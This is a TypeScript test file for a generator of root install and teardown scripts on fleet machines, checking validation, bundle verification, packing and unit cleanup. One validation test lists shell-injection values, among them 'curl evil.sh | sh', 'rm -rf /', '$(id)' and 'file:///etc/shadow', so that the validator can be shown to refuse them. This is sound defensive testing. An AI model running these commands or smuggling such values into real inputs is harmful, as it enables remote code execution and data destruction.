/**
 * The machine install's guards.
 *
 * This script runs as root on every Machine in a Fleet, built from values that arrive over
 * HTTP. Two classes of failure matter here and neither shows up as a broken converge: a value
 * that escapes into a shell command, and a step that is silently skipped so the Machine looks
 * placed while running the previous Bundle.
 */

import { describe, expect, it } from 'vitest';
import {
  machineTeardown,
  machineInstall,
  validateMachineActor,
  type MachineActor,
} from './programs/machine';

const OK: MachineActor = {
  name: 'webcrawl',
  version: '0.1.0',
  engine: 'py',
  bundleUrl: `http://10.124.0.2:5000/v2/bundles/webcrawl/blobs/sha256:${'a'.repeat(64)}`,
  bundleSha: 'a'.repeat(64),
  controller: '10.124.0.2',
  tag: 'crawl',
};

describe('validation', () => {
  it('accepts a well-formed actor', () => {
    expect(() => validateMachineActor(OK)).not.toThrow();
  });

  it('refuses anything that would escape into the root shell', () => {
    // The script is assembled by interpolation and runs as root. A value that reaches `sh`
    // unvalidated is a command, not a string — and the caller only needs the infra token to
    // supply one.
    const attacks: Array<Partial<MachineActor>> = [
      { name: 'a; curl evil.sh | sh' },
      { name: "a'$(id)'" },
      { version: '1.0.0; rm -rf /' },
      { controller: '10.0.0.1; wget x' },
      { controller: '$(hostname)' },
      { bundleUrl: 'http://x/a.tar.gz; rm -rf /' },
      { bundleUrl: 'file:///etc/shadow' },
      { bundleSha: 'not-a-sha' },
      { bundleSha: `${'a'.repeat(64)}; id` },
      { tag: 'crawl && reboot' },
      { engine: 'sh' as MachineActor['engine'] },
    ];
    for (const bad of attacks) {
      expect(() => validateMachineActor({ ...OK, ...bad }), JSON.stringify(bad)).toThrow(
        /not safe to place/
      );
    }
  });

  it('refuses a url and a sha that are not the same content', () => {
    // The two travel together from `resolveBundle` through the stack args to here, and the Machine
    // checks the second against what it downloads from the first. A mismatched pair used to be
    // undetectable until 65 MiB had been pulled onto every Machine at once and every one of them
    // exited 1; an OCI blob is addressed BY its digest, so the pair is now self-checking.
    expect(() =>
      validateMachineActor({
        ...OK,
        bundleUrl: `http://10.124.0.2:5000/v2/bundles/webcrawl/blobs/sha256:${'b'.repeat(64)}`,
      })
    ).toThrow(/does not serve bundleSha/);

    // A well-formed url for a DIFFERENT actor is the same bug wearing better clothes: it passes
    // every regex and places the wrong Bundle.
    expect(() =>
      validateMachineActor({
        ...OK,
        bundleUrl: `http://10.124.0.2:5000/v2/bundles/nscheck/blobs/sha256:${'b'.repeat(64)}`,
      })
    ).toThrow(/does not serve bundleSha/);
  });
});

describe('the install script', () => {
  const script = machineInstall(OK) as string;

  it('verifies the Bundle before unpacking it', () => {
    // An Artifact that is not content-checked is not content-pinned, and "what is actually
    // running" stops being answerable from the deploy command.
    expect(script).toContain('sha256sum');
    expect(script).toMatch(/bundle sha mismatch/);
    // The check must come BEFORE the extract, or a tampered Bundle is already on disk.
    expect(script.indexOf('sha256sum')).toBeLessThan(script.indexOf('tar -xzf'));
  });

  it('gives the Machine a container runtime AND the id range a user namespace needs', () => {
    // ADR 0036 collapses the Target axis to a container, so a Machine with no runtime can hold no
    // Worker at all; ADR 0037 gives that runtime its caller, which is the Warden.
    expect(script).toMatch(/apt_retry install[^\n]*podman/);

    // THE SUBUID ALLOCATION IS THE HALF THAT WAS A RUNBOOK. `--userns=auto` allocates a distinct
    // range per pod out of the `containers` entry in these two files, and a stock Ubuntu image has
    // no such entry — so `podman pod create` fails with "no subuid ranges found" and
    // driver_podman.go REFUSES rather than running a stranger's code as host root. That refusal is
    // the designed behaviour and it is also a Machine that can never hold a Worker.
    //
    // The exact value is asserted, not merely the file name: it is written independently in three
    // places (here, `driver_podman.go:usernsHint`'s printed fix, and slice 02's notes) and a
    // Machine provisioned with a different range still fails, just later and less legibly.
    for (const f of ['/etc/subuid', '/etc/subgid']) {
      expect(script, f).toContain(f);
    }
    expect(script).toContain('containers:524288:16777216');

    // IDEMPOTENT, and this is the assertion that costs something. A second converge runs this
    // script again on a Machine that already has the entry; appending it twice is what podman
    // reads as a conflicting allocation, so the write MUST be guarded by a read.
    const write = script.indexOf("echo 'containers:524288:16777216'");
    const guard = script.indexOf("grep -q '^containers:'");
    expect(guard, 'the append is unguarded').toBeGreaterThan(-1);
    expect(guard).toBeLessThan(write);

    // …and the podman install has its own `command -v` guard rather than riding on step 1's,
    // whose condition is pip3-and-curl-shaped: a Machine that already has those would skip the
    // whole block and never get a runtime.
    expect(script).toMatch(/if ! command -v podman >\/dev\/null 2>&1; then/);
  });

  it('installs the actor HOST runtime, which no base image supplies here', () => {
    // In a container these come from infra/Dockerfile.pyworker. A Machine has no base image,
    // and the omission surfaces as ModuleNotFoundError in a systemd restart loop — the actor
    // never starts and the placement looks like a converge problem.
    for (const pkg of ['temporalio', 'redis', 'boto3', 'pydantic']) {
      expect(script, pkg).toContain(pkg);
    }
    // temporalio above all: the actor process IS a Temporal activity worker, so the SDK is not
    // optional here. The names below must never come back — each belongs to the sidecar runtime
    // this Machine no longer has.
    for (const gone of ['dapr', 'uvicorn', 'fastapi']) {
      expect(script, gone).not.toMatch(new RegExp(`pip install[^\\n]*${gone}`));
    }
  });

  it('runs the actor\'s own deploy.sh, with the machine Target announced', () => {
    // One dependency script, both Targets. An actor whose deps live only in a Dockerfile
    // cannot be placed on a Machine at all.
    expect(script).toMatch(/KONTRA_TARGET=machine sh "\$ROOT\/actor\/\$ACTOR\/deploy\.sh"/);
  });

  it('points the state store at the Controller, not at the Machine', () => {
    // A Machine that keeps its own Redis is an island: session state and the global tier stop
    // being shared, and nothing says so. This used to take a component manifest rewritten by
    // sed; it is one env var now, and it is the ONLY thing telling the actor where state lives.
    expect(script).toContain('KONTRA_REDIS_HOST=$CONTROLLER:6379');
  });

  it('hands the Machine no endpoint for a service the Controller does not run', () => {
    // A schema-registry endpoint on `$CONTROLLER:8081` was written into worker.env on every
    // Machine of every Fleet. Nothing binds 8081 on the Controller, that service is in no
    // compose file, and no client in either SDK ever read the variable — so all it ever did was
    // tell an operator reading /etc/kontra/worker.env that a registry was in the loop. ADR 0027
    // removed the claim; this is the env half of it.
    //
    // Asserted as an ALLOWLIST rather than as the absence of one name, because the failure is a
    // value nobody consumes: an unread variable can only be believed by a reader, never observed
    // failing, so "does not contain X" only ever catches the one we already know about.
    // ═══ THIS SWEEP EXAMINED NOTHING FOR AS LONG AS IT HAS EXISTED ═══
    //
    // It sliced from `cat > …worker.env` to the next `ENV_EOF` — and the next `ENV_EOF` is on the
    // SAME LINE, in the `<<ENV_EOF` heredoc opener. So `env` was the twenty-eight characters
    // `cat > /etc/kontra/worker.env <<`, the loop below matched zero variables, and the test passed
    // green on every commit since it was written. Found while renaming the file for packing; the
    // rename would have broken it in the other direction (`indexOf` → -1) and it STILL would have
    // passed, which is what made it worth looking at.
    //
    // Two fixes, and both are needed: start after the opener, and count what was actually examined.
    const start = script.indexOf('cat > /etc/kontra/worker-$ACTOR.env <<ENV_EOF\n');
    expect(start, 'the env block moved and this sweep found nothing').toBeGreaterThan(-1);
    const body = script.slice(start + 'cat > /etc/kontra/worker-$ACTOR.env <<ENV_EOF\n'.length);
    const env = body.slice(0, body.indexOf('\nENV_EOF'));
    expect(env).not.toContain(':8081');
    const known = [
      'KONTRA_ACTOR_NAME',
      'KONTRA_ACTOR_VERSION',
      'KONTRA_ADDRESS',
      'KONTRA_ORCHESTRATOR_URL',
      'KONTRA_S3_ENDPOINT',
      'KONTRA_REDIS_HOST',
      'KONTRA_CONTROLLER',
      'KONTRA_TAG',
      'KONTRA_MAX_PARALLEL_SESSIONS',
      'KONTRA_METRICS_ADDR',
    ];
    let checked = 0;
    for (const line of env.split('\n')) {
      const name = /^(KONTRA_[A-Z_]+)=/.exec(line)?.[1];
      if (name) {
        checked += 1;
        expect(known, `${name} points at what?`).toContain(name);
      }
    }
    expect(checked, 'no KONTRA_ variable was examined').toBeGreaterThan(4);
  });

  it('writes the session cap, which is the only thing that makes density reachable', () => {
    // The gap `actorkit.fleet` forced closed. Both hosts read KONTRA_MAX_PARALLEL_SESSIONS and
    // both default to 4; nothing wrote it here, so every fleet ever placed ran at 4 — and the
    // failure is silent, because a host at its cap REFUSES an open retryably. The task goes back
    // to the shared queue and another Machine takes it, so asking for more concurrency than 4×N
    // did not fail, it queued, which is indistinguishable from slow targets.
    expect(machineInstall({ ...OK, maxSessions: 12 }) as string).toContain(
      'KONTRA_MAX_PARALLEL_SESSIONS=12'
    );
  });

  it('omits the cap entirely when nobody asked for one', () => {
    // Not `=` with an empty value. The Go host guards on `os.Getenv(...) != ""`, so a blank
    // assignment is read as a value and parsed as garbage — worse than the default it means to
    // leave alone.
    expect(script).not.toContain('KONTRA_MAX_PARALLEL_SESSIONS');
  });

  it('refuses a session cap that is not a plain count', () => {
    // It reaches a root shell by interpolation like everything else here, so the type is the
    // guard. The upper bound is the measured working range — a Session is a whole worker process.
    for (const bad of [0, -1, 1.5, 65, Number.NaN]) {
      expect(() => validateMachineActor({ ...OK, maxSessions: bad })).toThrow(/maxSessions/);
    }
    expect(() => validateMachineActor({ ...OK, maxSessions: 64 })).not.toThrow();
  });

  it('installs no sidecar, and leaves nothing behind that assumes one', () => {
    // The Machine runs exactly two processes. A leftover sidecar unit would start, fail to reach
    // a placement service that is not installed, and restart forever.
    for (const gone of ['daprd', 'placement', 'dapr-http-port', '/etc/kontra/dapr', 'secretstore']) {
      expect(script, gone).not.toContain(gone);
    }
    // The env it fed on goes too — a stale sidecar address would point at a dead port.
    expect(script).not.toContain('KONTRA_DAPR_SIDECAR');
    expect(script).not.toContain('KONTRA_APP_PORT');
  });

  it('starts the handler LAST and fails if it did not come up', () => {
    // The handler is what `kontra workers list` counts. A placement that "succeeds" with no
    // handler produces a Machine that is up, idle and invisible.
    const actor = script.indexOf('systemctl restart kontra-actor-webcrawl.service');
    expect(actor, 'the restart lines moved').toBeGreaterThan(-1);
    expect(actor).toBeLessThan(script.indexOf('systemctl restart kontra-handler-webcrawl.service'));
    expect(script).toMatch(/is-active --quiet \$u \|\| \{/);
  });

  /**
   * THE WATCHDOG IS GONE (ADR 0037), AND THE ASSERTION IT REPLACES WAS PINNING A CHECK THAT HAD
   * NEVER FIRED FOR ITS STATED REASON.
   *
   * What used to be here:
   *
   *     it('installs the watchdog, and it reads the ACTOR HOST log', () => {
   *       expect(script).toContain('kontra-watchdog.timer');
   *       expect(script).toMatch(/journalctl -u kontra-actor\.service/);
   *       expect(script).toMatch(/"\$pct" -ge 80/);
   *     });
   *
   * Every one of those three passed, and none of them touched the thing the watchdog was for. The
   * script counted `grep -ci 'unit failed\|SessionLost\|engine dead'` over
   * `grep -ci 'unit ok\|committed'` — and swept 2026-08-30 with `grep -rn -a` over `runtime/`,
   * `sdk/` and `handler/`, three of those five strings appear NOWHERE in this repo and the fourth
   * only in comments. The denominator was permanently zero, so with `MIN_UNITS=10` the timer could
   * fire only on ten stray tracebacks, always at 100%. It could not count 81 of 82.
   *
   * This is the shape `docs/agents` calls a test that supplies the buggy input: the assertion
   * checked that the SCRIPT was installed, which is a fact about this file, and never that the
   * script could count, which is a fact about the actor hosts. The replacement lives where the
   * counting does — `cli/sickworker_test.go` drives the real reconcile loop with the real 81-of-82
   * ratio against real processes, and `conformance/workerhealth.json` pins the two counters and the
   * three thresholds across all three languages that touch them.
   */
  it('installs no watchdog, and disables one a previous placement left armed', () => {
    expect(script).not.toContain('/opt/kontra/bin/watchdog.sh');
    expect(script).not.toContain('/etc/systemd/system/kontra-watchdog.service');
    expect(script).not.toContain('/etc/systemd/system/kontra-watchdog.timer');
    expect(script).not.toMatch(/journalctl -u kontra-actor\.service --since/);
    expect(script).not.toMatch(/systemctl enable --now kontra-watchdog/);

    // A re-converge must DISARM the old timer rather than leave it running beside the Warden.
    // Two authorities on one Worker is the bug ADR 0037's retirement exists to prevent, and a
    // Machine placed before this change still carries the unit until something disables it.
    expect(script).toContain('systemctl disable --now kontra-watchdog.timer kontra-watchdog.service');
  });

  it('installs the metrics agent, because a Machine cannot be scraped', () => {
    // Fleet Machines accept no inbound connections; the agent scrapes 127.0.0.1 and pushes.
    expect(script).toContain('vmagent');
    expect(script).toMatch(/127\.0\.0\.1:9110/); // the actor host's own counters
    // and NOT 9090, which was the sidecar's scrape target — a job pointing at a port nothing
    // binds turns every Machine's agent into a stream of scrape failures.
    expect(script).not.toMatch(/127\.0\.0\.1:9090/);
  });

  it('waits out cloud-init AND retries, because a lock timeout alone does not cover the lists lock', () => {
    // THREE ATTEMPTS AT THIS, AND WHY THE THIRD IS THE ONE.
    //
    // 1. `fuser … || break` — `fuser` is not installed on a minimal image, so its own absence
    //    read as "the lock is free" and walked straight into the collision.
    // 2. `DPkg::Lock::Timeout` alone — it covers the DPKG lock and NOT
    //    `/var/lib/apt/lists/lock`, which `apt-get update` takes. Two fleet runs died on
    //    `Could not get lock /var/lib/apt/lists/lock` with this in place, so the assertion that
    //    used to live here was pinning a fix that did not work.
    // 3. This: wait for cloud-init to finish, keep the lock timeout, and retry the whole
    //    apt-get on top. Any one of the three alone has a hole; the retry is what closes it,
    //    because it makes no claim about WHICH lock was busy.
    expect(script).toMatch(/DPkg::Lock::Timeout=\d+/);
    expect(script).toContain('cloud-init status --wait');
    expect(script).toMatch(/apt_retry\b/);
    expect(script).not.toMatch(/^\s*fuser /m); // the comment may name it; nothing may RUN it
  });

  it('leaves no TypeScript interpolation unresolved', () => {
    // A `${…}` that survives into the script is a TS template hole that became a SHELL
    // variable expansion of a name that does not exist — it expands to empty and the step
    // silently does the wrong thing.
    for (const shellVar of ['$ROOT', '$ACTOR', '$CONTROLLER', '$BUNDLE_SHA']) {
      expect(script).toContain(shellVar);
    }
    expect(script).not.toMatch(/\$\{a\./);
  });

  it('runs a Go actor as a binary and a Python one under python', () => {
    expect(machineInstall({ ...OK, engine: 'go' }) as string).toContain(
      'ExecStart=/opt/kontra/w/webcrawl/actor/webcrawl/webcrawl'
    );
    expect(script).toContain(
      'ExecStart=/usr/bin/python3 /opt/kontra/w/webcrawl/actor/webcrawl/actor.py'
    );
  });

  it('is byte-stable for the same inputs', () => {
    // The script IS the remote command's trigger content. A script that differed run to run
    // would redeploy the whole Fleet on every converge.
    expect(machineInstall(OK)).toBe(script);
  });
});

describe('teardown', () => {
  const teardown = machineTeardown('webcrawl');

  it('stops the handler before the host it drives', () => {
    expect(teardown.indexOf('kontra-handler')).toBeLessThan(teardown.indexOf('kontra-actor'));
  });

  it('disables every unit, so a rebooted Machine does not resurrect a Worker', () => {
    for (const u of ['kontra-handler-webcrawl.service', 'kontra-actor-webcrawl.service']) {
      expect(teardown, u).toContain(u);
    }
    expect(teardown).toContain('systemctl disable');
  });

  /**
   * ═══ THE ONE THAT MAKES PACKING SAFE ═══
   *
   * Pulumi deletes the placement a converge stopped mentioning, and running THIS is what deleting it
   * does. While a Machine held one Worker a constant teardown was right; the moment it packs (ADR
   * 0037) a constant is a Machine-wide stop, so removing one placement would take the co-tenant's
   * Worker down with it — successfully, and with nothing raising on either side.
   *
   * Asserted as a sweep over the co-tenant's OWN names rather than as "does not contain
   * kontra-actor.service", because the second form passes for a teardown that names nothing at all.
   */
  it('names only its own Worker, so removing one placement cannot stop its co-tenant', () => {
    const mine = machineTeardown('subfinder');
    for (const theirs of [
      'kontra-actor-webcrawl.service',
      'kontra-handler-webcrawl.service',
      '/etc/kontra/worker-webcrawl.env',
      '/etc/kontra/scrape.d/webcrawl.json',
    ]) {
      expect(mine, theirs).not.toContain(theirs);
    }
    // …and it really does name its own, so the sweep above is not passing on an empty string.
    expect(mine).toContain('kontra-actor-subfinder.service');
    expect(mine).toContain('/etc/kontra/scrape.d/subfinder.json');
  });

  /**
   * VMAGENT IS PER-MACHINE AND IS THEREFORE NOT A WORKER'S TO STOP. It was in this list, correctly,
   * while a teardown meant "this Machine is finished". On a packed Machine stopping it would end the
   * co-tenant's metrics — and metrics are how the **Warden** tells a Worker that is running from one
   * that is working (cli/sickworker.go), so the co-tenant would go on running and become unjudgeable.
   * What leaves with a Worker is its scrape TARGET, which is the file asserted above.
   */
  it('leaves the Machine-wide metrics agent alone', () => {
    expect(teardown).not.toContain('kontra-vmagent');
  });
});

/**
 * PACKING: several Workers on one Machine, sharing its egress address (ADR 0037).
 *
 * Every assertion here is about a path, and that is the point — the scheduling half of this slice
 * lives in `programs/fleet.ts`, but a scheduler that put two Workers on one Machine while this file
 * wrote singleton paths would have produced ONE Worker and a report of success. These are the paths
 * that make the second Worker exist.
 */
describe('packing', () => {
  const script = machineInstall(OK) as string;
  const a = machineInstall({ ...OK, name: 'nscheck', metricsPort: 9110 }) as string;
  const b = machineInstall({
    ...OK,
    name: 'subfinder',
    bundleUrl: OK.bundleUrl.replace(/[a-f0-9]{64}$/, 'b'.repeat(64)),
    bundleSha: 'b'.repeat(64),
    metricsPort: 9111,
  }) as string;

  /**
   * THE FILES THE TWO INSTALLS WOULD HAVE FOUGHT OVER, ENUMERATED.
   *
   * Read off the script rather than asserted from memory: every `cat > <path>`, every
   * `/etc/systemd/system/<unit>` and the unpack root. Two installs sharing ANY of them is a Machine
   * where the second placement silently replaces the first — which is precisely what step 3's
   * `rm -rf "$ROOT/actor"` used to do to a co-tenant's code.
   */
  // `$ACTOR` IS RESOLVED HERE BECAUSE THE SHELL RESOLVES IT THERE. `/etc/kontra/worker-$ACTOR.env`
  // is one literal in the script and two different files on the Machine, so a sweep that compared
  // the literals would report a collision that does not exist — and, worse, would go on reporting
  // one after a real collision was introduced, since the answer never changes.
  const writes = (script: string, name: string) =>
    [...script.matchAll(/^cat > (\S+)/gm)]
      .map((m) => m[1])
      .concat([...script.matchAll(/^ROOT=(\S+)/gm)].map((m) => m[1]))
      .concat([...script.matchAll(/\/etc\/systemd\/system\/(\S+\.service)/g)].map((m) => m[0]))
      .map((p) => p.replace(/\$ACTOR/g, name));

  it('writes no file that the co-tenant also writes', () => {
    const mine = writes(a, 'nscheck');
    const theirs = writes(b, 'subfinder');
    expect(mine.length, 'the write sweep found nothing').toBeGreaterThan(5);
    const shared = [...new Set(mine.filter((p) => theirs.includes(p)))].sort();
    // These four are Machine-wide ON PURPOSE and every install writes them with identical content:
    // the kernel settings the Warden's egress policy needs, the vmagent's own environment, its
    // config, and its unit. EVERYTHING ELSE MUST DIFFER — a fifth entry here is a file the second
    // placement overwrites, which is a Worker that silently replaced its co-tenant.
    expect(shared).toEqual([
      '/etc/kontra/vmagent.env',
      '/etc/kontra/vmagent.yml',
      '/etc/sysctl.d/99-kontra-warden.conf',
      '/etc/systemd/system/kontra-vmagent.service',
    ]);
  });

  it('unpacks each Bundle into a root of its own', () => {
    expect(a).toContain('ROOT=/opt/kontra/w/nscheck');
    expect(b).toContain('ROOT=/opt/kontra/w/subfinder');
    // The line that made this necessary. It is still here, and it now cannot reach a co-tenant.
    expect(a).toContain('rm -rf "$ROOT/actor" "$ROOT/actorkit"');
  });

  it('gives each Worker its own units', () => {
    expect(a).toContain('/etc/systemd/system/kontra-actor-nscheck.service');
    expect(b).toContain('/etc/systemd/system/kontra-actor-subfinder.service');
    expect(a).not.toContain('kontra-actor-subfinder');
  });

  /**
   * ═══ THE SILENT ONE, AND IT IS THE REASON `metricsPort` IS AN ARGUMENT ═══
   *
   * Both actor hosts default to :9110 and `metrics.py:serve` CATCHES the bind failure — "a metrics
   * listener must never take the actor down" — so a second packed Worker on a shared port runs
   * perfectly and serves nothing. The Warden's judge then reports `cannot tell` for it for ever,
   * which is the round-3 failure this repo already paid for, invisible on the busiest Machines.
   */
  it('gives each Worker its own metrics port and its own scrape target', () => {
    expect(a).toContain('KONTRA_METRICS_ADDR=127.0.0.1:9110');
    expect(b).toContain('KONTRA_METRICS_ADDR=127.0.0.1:9111');
    expect(a).toContain('/etc/kontra/scrape.d/$ACTOR.json');
    expect(a).toContain('"targets": ["127.0.0.1:9110"]');
    expect(b).toContain('"targets": ["127.0.0.1:9111"]');
    // ONE agent, N targets: the config points at the directory rather than at one address, so a
    // second Worker's file is scraped without the config being rewritten.
    expect(a).toContain("file_sd_configs: [{files: ['/etc/kontra/scrape.d/*.json']}]");
  });

  it('leaves a Machine holding one Worker on the hosts own default port', () => {
    // THE CONTROL. An implementation that always wrote the variable would change the environment of
    // every Machine in every existing Fleet for a property none of them needs.
    expect(script).not.toContain('KONTRA_METRICS_ADDR');
    expect(script).toContain('"targets": ["127.0.0.1:9110"]');
  });

  it('refuses a metrics port that is not one', () => {
    for (const bad of [0, -1, 80, 1023, 65536, 9110.5, Number.NaN]) {
      expect(() => validateMachineActor({ ...OK, metricsPort: bad })).toThrow(/metricsPort/);
    }
    expect(() => validateMachineActor({ ...OK, metricsPort: 9111 })).not.toThrow();
  });

  /**
   * ═══ THE METRICS AGENT READS THE MACHINE'S ENVIRONMENT, NOT A WORKER'S ═══
   *
   * It read `/etc/kontra/worker.env` and stamped `actor=${KONTRA_ACTOR_NAME}` on every series it
   * pushed. That was true while a Machine held one Worker and is a LIE the moment it packs:
   * whichever Worker's env file the unit happened to name would label the OTHER one's counters as
   * its own, so the two Workers' load ratios would arrive at the Controller under one actor and the
   * per-Machine attribution that found the round-3 failures would be gone.
   *
   * It is also a dangling reference. `machineTeardown` deletes a Worker's env file, so an agent
   * pointed at it would fail to start on the next boot of a Machine whose placement had moved on.
   */
  it('points the Machine-wide metrics agent at the Machine-wide environment', () => {
    expect(a).toContain('EnvironmentFile=/etc/kontra/vmagent.env');
    expect(a).toContain('cat > /etc/kontra/vmagent.env');
    // The agent's unit must not name any Worker's file, and the sweep is over BOTH Workers' names
    // rather than over the one string that was there — a unit reading `worker-subfinder.env` is the
    // same bug as one reading `worker.env`.
    // SLICED PAST THE HEREDOC OPENER, because the closing word is also ON it — `cat > … <<'UNIT_EOF'`
    // — so slicing to the next `UNIT_EOF` gives forty-six characters of shell and none of the unit.
    // That is the same mistake the env-file sweep above had been passing on since it was written.
    const opener = "cat > /etc/systemd/system/kontra-vmagent.service <<'UNIT_EOF'\n";
    const at = a.indexOf(opener);
    expect(at, 'the vmagent unit moved and this sweep found nothing').toBeGreaterThan(-1);
    const rest = a.slice(at + opener.length);
    const unit = rest.slice(0, rest.indexOf('\nUNIT_EOF'));
    expect(unit).toContain('[Service]');
    for (const worker of ['worker-nscheck.env', 'worker-subfinder.env', 'worker.env']) {
      expect(unit, worker).not.toContain(worker);
    }
    // AND IT NO LONGER LABELS BY ACTOR AT ALL — that label comes from the scrape target now, which
    // is the only place on a packed Machine where it can be true.
    expect(unit).not.toContain('KONTRA_ACTOR_NAME');
    expect(a).toContain('"labels": {"actor": "$ACTOR"');
  });

  /**
   * A MACHINE PLACED BEFORE THIS CHANGE CARRIES THE SINGLETON UNITS, and leaving them armed beside
   * the namespaced pair is TWO pollers on one queue — the failure `cli/driver.go`'s seam exists to
   * prevent. Disarmed at install time so the transition does not depend on Pulumi's ordering between
   * creating the new resource and deleting the old one.
   */
  it('disarms the pre-packing singleton units on every converge', () => {
    expect(script).toContain(
      'systemctl disable --now kontra-actor.service kontra-handler.service'
    );
  });
});

/**
 * The placement no longer owns tmux (ADR 0020).
 *
 * These assertions replace a block that pinned the opposite — that `--tmux` installed
 * `kontra-tmux.service` and apt-installed tmux. Both are gone, and what went with them is a SILENT
 * failure: the unit was `ConditionPathExists=/usr/bin/tmux` next to an apt install this script was
 * allowed to fail, so a Machine could deploy "successfully" and never be viewable, with nothing in
 * the deploy output saying so. Session existence is `tmuxSessionWorkflow` now, which is also what
 * lets a Machine deployed WITHOUT a session be given a Terminal on demand, with no re-deploy.
 */
describe('tmux is no longer a placement concern', () => {
  const script = machineInstall(OK) as string;

  it('emits no kontra-tmux.service, in any form', () => {
    expect(script).not.toContain('kontra-tmux.service\n'); // not as a unit file name
    expect(script).not.toContain('/etc/systemd/system/kontra-tmux.service');
    expect(script).not.toContain('ExecStart=/usr/bin/tmux');
    expect(script).not.toContain('tmux new-session');
    expect(script).not.toContain('tmux new-window');
    expect(script).not.toContain('systemctl enable kontra-tmux.service');
    expect(script).not.toContain('systemctl restart kontra-tmux.service');
  });

  it('does not apt-install tmux', () => {
    for (const line of script.split('\n')) {
      if (/apt-get[^\n]*install/.test(line)) expect(line).not.toContain('tmux');
    }
  });

  /**
   * The invariant that outlives the unit, and is now load-bearing rather than stylistic: ADR 0020's
   * finding (2) measured a stalled viewer segfaulting a tmux server, destroying every session on
   * that socket. Because fleet panes hold only journals, that costs the view and never the Worker —
   * systemd's restart policy keeps supervising the processes themselves, and the **Warden** is what
   * judges a Worker that is running and not working (ADR 0037; the watchdog this sentence used to
   * name is retired, and never counted the ratio it claimed to).
   */
  it('leaves both halves of the Worker under systemd, started directly', () => {
    expect(script).toContain(
      'ExecStart=/usr/bin/python3 /opt/kontra/w/webcrawl/actor/webcrawl/actor.py'
    );
    expect(script).toContain('ExecStart=/opt/kontra/w/webcrawl/bin/handler');
  });

  /**
   * THIS USED TO ASSERT THE TEARDOWN NAMED `kontra-tmux.service`, AND IT NO LONGER CAN.
   *
   * A teardown names ONE Worker's units now (see `machineTeardown`), because a constant one would
   * stop a co-tenant. So the retired singletons — `kontra-tmux.service` (ADR 0020),
   * `kontra-watchdog.timer` (ADR 0037) and the pre-packing `kontra-actor.service` pair — are
   * disarmed on every CONVERGE instead, which reaches the same Machines and reaches them sooner. A
   * Machine placed before ADR 0020 still carries the old resource in Pulumi's state, and that
   * resource carries the old teardown, which is what runs when it is deleted.
   */
  it('disarms the pre-ADR-0020 session unit on every converge instead', () => {
    expect(script).toContain('kontra-watchdog.timer');
    expect(script).toContain('systemctl disable --now kontra-actor.service');
    expect(machineTeardown('webcrawl')).not.toContain('kontra-tmux.service');
  });
});
